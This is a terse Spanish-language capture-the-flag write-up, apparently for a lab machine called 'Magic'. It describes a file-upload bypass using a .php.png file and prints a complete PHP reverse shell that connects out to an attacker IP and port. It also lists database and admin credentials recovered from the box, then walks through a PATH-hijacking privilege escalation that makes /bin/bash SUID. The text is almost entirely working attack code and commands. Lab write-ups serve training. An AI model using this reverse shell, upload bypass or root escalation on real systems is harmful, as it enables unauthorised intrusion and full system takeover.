---
title: "Magic"
---

# Magic

Básicamente subir una `.php.png` pero con mimetype de png.

A veces no va la de pentestmonkey ni rev shells y hay que recurrir a otras alternativas
```php
<?php $ip="10.10.14.4";$port=4444;$s=fsockopen($ip,$port);$p=proc_open("/bin/sh -i",[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]],$pipes);while(1){if(feof($s)||feof($pipes[1]))break;$r=[$s,$pipes[1],$pipes[2]];$w=$e=null;stream_select($r,$w,$e,null);if(in_array($s,$r))fwrite($pipes[0],fread($s,1400));if(in_array($pipes[1],$r))fwrite($s,fread($pipes[1],1400));if(in_array($pipes[2],$r))fwrite($s,fread($pipes[2],1400));}fclose($s);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);?>
```

```bash
cat db.php5
```

```
theseus \ iamkingtheseus
```

```
admin \ Th3s3usW4sK1ng
```

```
pspy
```

```bash
/usr/sbin/cups-browsed 
/usr/sbin/cupsd -l
```

# PATH HIJACKING

```bash
/bin/sysinfo
```

```bash
ltrace /bin/sysinfo
```

```bash
#!/bin/bash

chmod u+s /bin/bash
```

```bash
chmod +x fdisk 
```

```bash
export PATH="/tmp:$PATH"
```

```bash
bash -p
```

```bash
/bin/sysinfo
```
